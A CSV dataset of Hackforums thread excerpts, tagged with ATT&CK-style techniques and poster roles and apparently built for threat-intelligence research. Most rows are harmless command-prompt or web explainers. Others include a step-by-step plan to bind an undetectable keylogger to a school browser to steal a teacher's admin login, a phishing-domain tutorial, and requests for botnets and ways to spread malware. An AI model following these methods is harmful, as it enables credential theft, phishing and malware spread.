Topic,Technique,Tactic,Role,Thread,Content
Bypass Age Filter On Y0utube.,Abuse elevation control mechanism,,Author,https://hackforums.net/showthread.php?tid=6101553,"Small but simple tut for youtube. (Useful For Beginners) Problem:You want to watch a vid but youtube classifies you as a minority and doesn't allow you to watch your favourite Ke$ha video. - 🤩 The Fix: Rework the URL. - A Sample URL: (Some Hardstyle mix with soft porn as pic) http://www.youtube.com/watch?v=gBP_0FlRY94 Yootoob would give you some age verification message from that. We change this to ↓ http://www.youtube.com/v/gBP_0FlRY94 And Kabam it works! Code http://www.youtube.com/v/ID_HERE ↑ Is your template. Only problem is, is that it becomes fullscreen and I'm not sure if there's a workaround for that. Not 100% sure but I think this doesn't work on ""non-embedded"" videos either. Have fun and thanks for reading"
Latest C/C++ HTTP botnet for sale? (loader capabillites),"Obtain capability,External Remote Services,Exploitation of remote services",,Buyer,https://hackforums.net/showthread.php?tid=6102384,"Does anyone know what the latest http botnet is and where I can buy it? It needs to be c/c++, able to execute files."
Short talk about cookies,Develop capabilities,,Author,https://hackforums.net/showthread.php?tid=6096644,"Just a short tutorial about cookies What is a cookie? A cookie is a text-only string of information that a website transfers to the cookie file of the browser on your computer’s hard disk so that the website can remember who you are. Each time you open a website that uses cookies, it checks to see if a cookie is already stored locally on your computer - If it is, then it can use that to find out some past information about you. A cookie will typically contain the name of the domain from which it originated, the lifetime of the cookie, and a unique value, usually a randomly generated number. Mainly two types of cookies are used on this website: Session cookies which are temporary cookies that remain in your browser until you leave the site Persistent cookies which remain in your browser for much longer (though how long will depend on the lifetime of the specific cookie - anything from several days to the end of time). Cookies can help a website to arrange content to match your preferred interests more quickly. Most major websites use cookies. Cookies may or may not be used by just by themselves to identify you. But they are usually only used to optimize content based on your past interests and experiences on a particular website."
[ TUT ] How to crypt you bin file by Themida v2.4.6.0,"Develop capabilities, Data Encrypted for Impact",,Author,https://hackforums.net/showthread.php?tid=6102203,How to crypt you bin file by Themida v 2.4.6.0
Study on Command Injection in GitLab Community and Enterprise Edition 11.11,Command and Scripting Interpreter,,Author,https://hackforums.net/showthread.php?tid=6102031,"Study on Gitlab's SSRF vulnerability allowing RCE by authenticated users (CVE-2019-12430) Server Side Request Forgery And Cross Application Scripting SSRF is Server Side Request Forgery. This issue occurs when an application sends requests over the internet to an attacker-controlled location. Attackers have many uses for such functionality, including: Denial of Service attacks A reflected DoS vulnerability is when an attacker can send a small request that results in a large request being sent to an attacker-controlled endpoint. Access to internal networks The attacker can send web requests to other servers running within the same network. This is especailly dangerous if the result of the request is returned to the attacker. This could expose sensitive data Access to internal networks includes the machine the attack is being run on - this could allow the attacker to perform port scans, or even talk to other services running on the local machine that aren't internet accessible Reflected exploitation If the attacker knows of an exploit for another service, and has control over most of the request, he may be able to send an exploit through the SSRF, preventing his IP from appearing in logs on the affected service. CAS CAS stands for Cross Application Scripting. Cross Application scripting allows one application to communicate with another. Cross Application Scripting is when an attacker tricks an application into talking to another application. For example, you can talk HTTP to a memcached server. The memcached server will discard all invalid commands, and valid commands will be run. For example, a request using the custom HTTP method ""stats sizes"" will look like the following:"
How to Crack an Smtp,"Exfiltration Over Alternative Protocol,Exfiltration Over C2 Channel",,Information Seeker,https://hackforums.net/showthread.php?tid=6003696,"Anyone here has an idea how i can crack an smtp for a mail domain ,Pm for more details."
(Kali Linux Tutorial) How to scan for open ports with built-in Metasploit Scanner,"Network sniffing,Network Denial of Service",,Author,https://hackforums.net/showthread.php?tid=5987090,"There are multiple scanners you can use for open ports using Metasploit. But for this tutorial, we will just be using the TCP scanner. *You will need to be running Kali Linux in order to complete this tutorial. Or have an installation of the framework.* Step 1: Open up a terminal and type in ""msfconsole"" to get the Metasploit framework started."
How to Generate 100's of Phishing Domains Quickly,Phishing,,Author,https://hackforums.net/showthread.php?tid=5987695,"For this tutorial, we are going to be using dnstwist which a python program created to develop phishing domains. Kali Linux is going to be our distro. Step 1: We are going to need to download the tool first from the Github repository. So let's open up a terminal and start the cloning. Type ""git clone"" followed by the location of the repository which is https://github.com/elceef/dnstwist [Image: hjKVzTM.png] Step 2: One the cloning has finished we will need to change our directory to the dnstwist folder since the python script is located in there. List all the files using the ""ls"" command to see what is included in the folder. [Image: VlJnAPs.png] Step 3: ""dnstwist.py"" is the script we are going to be running. We need to run it in python, so in order to do this, you have to type ""python"" first before running the python script. This will then run the script and show the options we have to choose from. I added 20 threads by including the ""-t"" option followed by the number of threads."
Sql default passwords,"Valid accounts,Drive by compromise",,Author,https://hackforums.net/showthread.php?tid=6091197,"I heard that the defaults for mysql was root:mysql and mssql was ""sa"" with no password. Is this true?"
how to know the real ip address behind cloudflare,"Drive by compromise,Exploitation of Remote Services",,Author,https://hackforums.net/showthread.php?tid=6093654,as the title say anyone know how i tried everything but didn't find any solution they don't have any mail and also fake and hidden info on whois some websites showing a ip address but that goes to another website
I want know about SSL is helpful in phising,Phishing,,Information Seeker,https://hackforums.net/showthread.php?tid=6024296,"Hello, When I send phishing mail it goes into spam because of url. I think if I use ssl then spam rate become smaller. What do you think? I need your help."
Hack Game Filetype Lingo,Develop capabilities,,Author,https://hackforums.net/showthread.php?tid=6101462,"Very short and simplistic thread for anyone playing the hack game and not quite sure on the different filetypes listed in the shop. If you're actually into hacking or just possess general knowledge there's probably not much to learn from it, but I learnt a decent amount from my research in regards to the .sh filetype. First of all, you’ll notice there are four different filetypes available. .exe = This is your standard executable file and easily the most well-known of the four. An executable file (exe file) is a computer file that contains an encoded sequence of instructions that the system can execute directly when the user clicks the file icon. Some exe files are generally seen as posing a higher security risk due to them being able to run by themselves without necessitating the existence of another program. Some of the many filetypes for these are BAT/COM/CMD/INF/IPA/OSX/PIF/RUN/WSH. .pdf = A file format developed by Adobe in the 1990s to present documents, including text formatting and images, in a manner independent of application software, hardware, and operating systems. This is a portable document file, notorious for several zero-day occurrences in which a single click of a PDF document was able to give hackers access to the PC’s which the document had been mailed to with malicious intent. Generally, the format is used when you need to save files that cannot be modified but still need to be easily shared and printed. Today almost everyone has a version of Adobe Reader or other program on their computer that can read a PDF file, hence why it is so useful for hacking if one is able to pack malicious code/scripts into one before having someone else open it; practically every modern PC can run the filetype with a single click. Interesting read on apple’s first ransomware attack/Microsoft word exploit via pdf format - https://www.express.co.uk/life-style/sci...attachment .doc A DOC file is a word processing document created by Microsoft Word, or another word processing program, such as OpenOffice Writer or Apple Pages. It may contain formatted text, images, tables, graphs, charts, page formatting, and print settings. Many members of the general public see .doc files as one of the safest types and thus don’t expect anything remotely malicious to be embedded within them due to how well-known word is for using said filetype. .sh = An SH (Shell script file) is a script programmed for bash, a type of Unix shell (Bourne-Again SHell). It contains instructions written in the Bash language and can be executed by typing text commands within the shell's command-line interface. Shell scripting is often used to automate your day to day task like sending some regular mail to your company / to kill multiple processes. Will update this with other lingo in the near future."
how to sprea payload,Develop capabilities,,Information Seeker,https://hackforums.net/showthread.php?tid=6101435,What is the best way to spread virus payload as exe files without the use of exploits? someone should please help me
Bypass Powershell script 100% work,"Exploitation of Defense Evasion,Impair Defenses",,Author,https://hackforums.net/showthread.php?tid=6101402,"This is my first tutorial. This script allows files to be downloaded and executed through PowerShell scripts without being detected by antivirus. I've written two methods, so check them out."
How to hack: A beginners guide to windows hotkeys and the command prompt day 3 part 4,"Develop capabilities,Command and Scripting Interpreter",,Author,https://hackforums.net/showthread.php?tid=6101128,"DOSKEY DOSKEY is a command for DOS, IBM OS/2, Microsoft Windows, and ReactOS that adds command history, macro functionality, and improved editing features to the command-line interpreters COMMAND.COM and cmd.exe . DRIVERQUERY The driverquery command enables an administrator to display a list of installed device drivers. ECHO In computing, echo is a command that outputs the strings it is being passed as arguments. ... It is a command available in various operating system shells and typically used in shell scripts and batch files to output status text to the screen or a computer file, or as a source part of a pipeline.n computing, echo is a command that outputs the strings it is being passed as arguments. ... It is a command available in various operating system shells and typically used in shell scripts and batch files to output status text to the screen or a computer file, or as a source part of a pipeline. ENDLOCAL The endlocal command is used to stop the localization of the environment changes enabled by the setlocal command. ERASE deletes one or more files EXIT quits the command.exe interpreter FC n computing, fc is a command-line program in DOS, IBM OS/2 and Microsoft Windows operating systems, that compares multiple files and outputs the differences between them. FIND The find command is a powerful *nix utility that allows the user to find files located in the file system via criteria such as the file name, when file was last accessed, when the file status was last changed, the file's permissions, owner, group, size, or even number of inodes. FINDSTR In computing, findstr is a command in the command-line interpreters (shells) of Microsoft Windows and ReactOS. It is used to search for a specific text string in computer files. FOR Runs a specified command for each file in a set of files. FORMAT he format command creates a new root directory and file system for the disk. It can also check for bad areas on the disk, and it can delete all data on the disk. To be able to use a new disk, you must first use this command to format the disk. FSUTIL Displays or configures the file system properties. FTYPE Displays or modifies file types used in file extension associations."
How to hack: A beginners guide to windows hotkeys and the command prompt day 3 part 2,"Develop capabilities,Command and Scripting Interpreter",,Author,https://hackforums.net/showthread.php?tid=6100973,"In computing, cacls and its replacement, icacls , are Microsoft Windows native command line utilities capable of displaying and modifying the security descriptors on folders and files. An access control list is a list of permissions for securable object, such as a file or folder, that controls who can access it. CALL The CALL command will launch a new batch file context along with any specified parameters. When the end of the second batch file is reached (or if EXIT is used), control will return to just after the initial CALL statement. Arguments can be passed either as a simple string or using a variable: CALL MyScript.cmd ""1234"" CD /CHDIR The cd command, also known as chdir (change directory), is a command-line shell command used to change the current working directory in various operating systems. It can be used in shell scripts and batch files. CHCD The chcp command is used to supplement the international keyboard and character set information, allowing MS-DOS to be used in other countries and with different languages. Before the chcp command can be used, the nlsfunc must be loaded, as well as the country. CHKDSK To do this, open up command prompt (click Windows key + X then select Command Prompt - Admin). In the command prompt window, type in CHKDSK then a space, then the name of the disk you wish to check. For example, if you wished to perform a disk check on your C drive, type in CHKDSK C then press enter to run the command. CHKNTFS The chkntfs command is used to display or modify the checking of the disk drive using NTFS at boot time. CLS as previously said clears the screen CMD starts a new instance of the command line interpreter COLOR If you'd prefer to change the color without entering commands, just click on the Command Prompt icon in the top left corner of the window and select Properties. Select the Colors tab, and then choose the color you want for the screen text and background. You can also enter your own RGB color combination if you want.Jul 5, 2017"
How to hack: A beginners guide to windows hotkeys and the command prompt day 3,"Develop capabilities,Command and Scripting Interpreter",,Author,https://hackforums.net/showthread.php?tid=6100967,"BCDEdit is a command-line tool for managing Boot Configuration Data (BCD). BCD files provide a store that is used to describe boot applications and boot application settings. BCDEdit can be used for a variety of purposes, including creating new stores, modifying existing stores, adding boot menu options, and so on."
how to open a program in cmd,"Develop capabilities,Command and Scripting Interpreter",,Author,https://hackforums.net/showthread.php?tid=6100966,Type start [filename.exe] into Command Prompt. This command will allow you to run a program from the selected file path.
[TUT] | HOW TO CREATE FREE WEBHOST |,"Drive by compromise,Exploitation of Remote Services",,Author,https://hackforums.net/showthread.php?tid=6100728,"Hello guys, today I'm teaching you how to create free webhost. 1: Register Free Domain At: Freenom. com 2: Change Nameservers To: ns1.byet.org ns2.byet.org ns3.byet.org ns4.byet.org 3: Go To MyOwnFreeHost.Net Sign Up With The Domain & Email Adress. 4: You'll Receive An Email Under 5: Hrs With The Details Of cPanel 6: Enjoy"
How to hack: A beginners guide to windows hotkeys and the command prompt day 3,"Develop capabilities,Command and Scripting Interpreter",,Author,https://hackforums.net/showthread.php?tid=6100528,"Your hot key for the day is BREAK MS-DOS and Windows command line break command. The break command may be used to enable or disable the breaking capability of the computer. For example, if you wanted to cancel a batch file or another MS-DOS processes, you can press Ctrl+C for a prompt asking if you want to cancel the current process."
when hacking an open port and using terminal to remote control their machine,"Remote services,External remote services",,Information Seeker,https://hackforums.net/showthread.php?tid=6100360,When remote controlling a machine using a linux terminal. How can you find things names locations and other personal data. This is strictly for research purposes and I'm not hacking any real people.
Mastering the Art of Google Dorks [Part 1],Develop capabilities,,Author,https://hackforums.net/showthread.php?tid=6100092,"What is Google Hacking? It is a method used by Penetration Testers or Hacker to successfully find a loophole based on the query itself in which leads to the vulnerable opening of the website itself. Often known as the most basic of the basic in terms of Hacking and is the most dangerous when a critical private dork falls into the wrong hands that will affect multiple domains and platforms. Are you struggling to find Fresh and HQ Dorks for you to test or exploit? Submit Dorks at GHDB to rank yourself? Query: Frequently posted on Hacking blogs or posts around the internet and since we are on the topic, I’ll give you more information about it and clear up the unnecessary confusion that may arise. I would also just mention the one I commonly use and remove the extras. inurl: --- The query I frequently use, It specifically targets /[vulnerability.php] on a domain. It basically has the same functions as [domain:] but using that query only targets 1 website/domain. intext: --- Whatever is written inside the website that matches your keyword. Used effectively with [intitle:] on advanced blind searches. intitle: --- The Header or Title of a Website, Vulnerable Administrator Panels can specifically targeted with this one. ext: --- Used to determine file types on the end of the URL [filetype:] is an alternative. + --- If you have 2 or more keywords that you want to target specifically. The [-] sign is only usable on accurate specific searches. Believe me or not that is the only queries you will have to use in searching dorks unless you are directly searching something. No need to memorize a whole Encyclopedia of queries. Too Long or Too Short? I don’t know what to describe this one as it’s usually making a Google Dork too long or too short making it not usable. Usually, in simple terms, we can’t predict how long or how less it is when making a Google Dork, But let me tell you this, There’s no perfect way on how to know whether your dork is too long or too short."
How to hack: A beginners guide to windows hotkeys and the command prompt day 2 part 2,"Develop capabilities,Command and Scripting Interpreter",,Author,https://hackforums.net/showthread.php?tid=6100313,"ATTRIB displays or changes file attributes more specifically: Using the ATTRIB command, you can change a file`s read/write attribute or set the archive attribute. If you use this command to specify a file as read-only, the file can be accessed, but not altered or deleted."
How to hack: A beginners guide to windows hotkeys and the command prompt day 2,"Develop capabilities,Command and Scripting Interpreter",,Author,https://hackforums.net/showthread.php?tid=6100256,Continuing the short list of hotkeys for windows and command prompt with an odd little example-- for the windows hotkey there is control a which is select all and there is assoc which displays the file extensions here is an example: C:\Users\ASUS>assoc .001=WinRAR .386=vxdfile .3g2=WMP11.AssocFile.3G2 .3ga=VLC.3ga .3gp=WMP11.AssocFile.3GP .3gp2=WMP11.AssocFile.3G2 .3gpp=WMP11.AssocFile.3GP .669=VLC.669 .7z=WinRAR .a52=VLC.a52 .AAC=WMP11.AssocFile.ADTS .accda=Access.ACCDAExtension.16 .accdb=Access.Application.16 .accdc=Access.ACCDCFile.16 .accde=Access.ACCDEFile.16 .accdr=Access.ACCDRFile.16 .accdt=Access.ACCDTFile.16 .accdu=Access.WizardUserDataFile.16 .accdw=Access.WebApplicationReference.16 .accft=Access.ACCFTFile.16 .accountpicture-ms=accountpicturefile .acl=ACLFile .acrobatsecuritysettings=AcroExch.acrobatsecuritysettings .ade=Access.ADEFile.16 .adn=Access.BlankProjectTemplate.16 .adp=Access.Project.16 .ADT=WMP11.AssocFile.ADTS .ADTS=WMP11.AssocFile.ADTS .aif=VLC.aif .aifc=VLC.aifc .aiff=VLC.aiff .amv=VLC.amv .ani=anifile .aob=VLC.aob .ape=VLC.ape .api=AcroExch.Plugin .appcontent-ms=ApplicationContent .application=Application.Manifest .appref-ms=Application.Reference .arj=WinRAR .asa=aspfile I would have put all of them but the post was too long so here is the abbreviated list.
how to clear the screen on command prompt,"Develop capabilities,Defacement",,Author,https://hackforums.net/showthread.php?tid=6100008,type cls and then you have a screen cleared of clutter.
How to hack: A beginners guide to windows hotkeys and the command prompt day 1,"Develop capabilities,Command and Scripting Interpreter",,Author,https://hackforums.net/showthread.php?tid=6099983,Right so out of a desire to learn and teach at the same time I thought it would be cool to pick a topic that basically anyone that hates using a mouse (Hint hint I fucking hate using a mouse.) So to get started all you need is windows and then all you have to do is hit the windows key located between 'fn' and 'alt' on the left side then hit the 'c' key this will bring up the command prompt then hit enter and the command prompt will be brought up.
[TUT] how to get back a deleted twitter account,"Valid accounts,Drive by compromise",,Author,https://hackforums.net/showthread.php?tid=6099826,"introduction this is guide on how to reactivate a deleted twitter account FIRSTLY: you have to email restore@twitter.com saying the following ""my account at @yourtwitternamehere was hacked and deleted without my permission and i want it restored. SECONDLY:they will reply saying ""what type of restoration are you asking for"" and once again you say ""my account at @yourtwitternamehere was hacked and deleted without my permission and i want it restored please"" and thats all you do on your part In a few days(MAYBE) hours if they are not busy they will restore you account and send you a password reset link to that email you talked to them from and waaalaa there you go. if they do not respond to you in a week then send another email. but this does work, i know for sure since twitter suspended their restoration service this is the ONLY way to trick twitter into giving back your account if you deleted it and want it back good luck. comment if you find this useful, ive used this method 3 times so far"
[Tutorial] REVERSE SHELL SERIES - The Basics (Part 2) [Tutorial],"Develop capabilities,Command and Scripting Interpreter",,Author,https://hackforums.net/showthread.php?tid=6071828,"Greetings to all HF members, I'm introducing the reverse shell series for everyone who wants to learn about the reverse shell in depth. As me and my partner нα¢кєя have already written a book - Hands On - Red Team Tactics that has this chapter, we would like to expand the horizon for everyone to learn more about reverse shells with different case scenarios. Checkout the first part here: REVERSE SHELL SERIES - The Basics (Part 1) In this tutorial, you'll learn about: [+] Getting started with Reverse TCP Shell [+] Analysing Reverse TCP Shell using Wireshark [+] Issues with the basic reverse shell Starting with reverse TCP shell Spoiler (Click to View) Analyzing Reverse TCP Shell using Wireshark Spoiler (Click to View) Issues with the basic reverse shell"
I want to start getting into hacking,"Develop capabilities, Hijack execution flow",,Author,https://hackforums.net/showthread.php?tid=6098184,"Hello, I want to start getting into hacking, but I know that there are a lot of fields of hacking, and they all interesting me. So my problem is that I don't know where to start. I have a few goals that I want to be able to archive: - be able to break into secure networks and systems and websites and script my own attack scripts - be able to reverse engineer and perform binary exploitation and develop exploits (for systems and for games) - develop malwares I know what each field requires me to learn, but I just need a direction according to my goals, what should I start with and what to learn after?"
[GUIDE] Gain admin rights on your schools network,"Develop capability,External Remote Services,Exploitation of remote services",,Author,https://hackforums.net/showthread.php?tid=6099478,"How to become administrator on your schools network😎 Before starting off you will require a few things to make sure everything works smoothly. FUD keylogger(not password stealer, do not confuse the 2) PE(.exe) binder You can either code a TCP echo server and have it listen for your key logger or you can save the data locally. Knowledge in a programming language wich can be compiled to a PE(I recommend making the keylogger in that language as it will be easier to use the binder) A copy of the browser ised at your school. Make sure to get everything ready at home to avoid getting caught 1. Code your key logger : Make sure the logger can not be seen as a terminal or as a suspicious proccess in Task Manager. Before UAC is prompted, spawn a message box with an error detailing why UAC is needed(optional but will make it more legit). The error can be stuff like invalid files, cache errors, datetime errors(pretty suspicious) get creative and make sure it looks legit Start your key logger Require UAC Throw an error and kill the PID if UAC is not granted 2. Bind your logger to your schools web browser: Open your PE binder of choice. Bind the key logger to your schols web browser. Test detection using a no share virus scanner( Its best if you know wich AV your school uses so you can make sure its FUD for that AV). ( If it is not FUD I do not recommend proceeding as it may lead to you getting caught and suspended)) 3. Put the files on a USB stick and carry it with you to school the next day. ( It would be good if your school has a place for students to use the PCs in the break, since most schools make a folder for each student it would allow you to replace the web browser without your teacher being around) 4. Run the newly created browser and wait for the error to pop up. 5. Call your teacher and ask her/him for help, say you tried to close it but it keeps coming up etc 6. If you are lucky enough, your teacher will enter his/her admin login details and your logger will grab them. ( Not all teachers are admins so take that into consideration) This is just a concept, I do not recommend trying this as it may get you in trouble. I am not responsible for any damage you cause to your/the schools PC. You can try this on your own risk."
Want a bulletproof setup for WICKR,External Remote Service,,Author,https://hackforums.net/showthread.php?tid=6098931,I communicate on wickr to people. Wickr saves IP addresses and device ID. So I need a setup to counter this. I’m not a computer expert just a novice. Would really appreciate it if any of you could throw some ideas or tips my way. Here’s the options I’ve thought of so far: Option 1. I was thinking about renting an RDP with WICKR installed through a VPN or TOR. That way I could change the MAC address and the IP would then communicate from the RDP. Perhaps install a VPN program on the RDP too. Option 2. Linux tablet with changed MAC address with WICKR installed tethered to a 4g modem going through Tor and a VPN. Better ideas would be awesome thanks in advance. Obviously security is paramount on the local device I use too. Which I need to take into account and I would prefer for it to be mobile. I need to consider authorities getting hold of it.
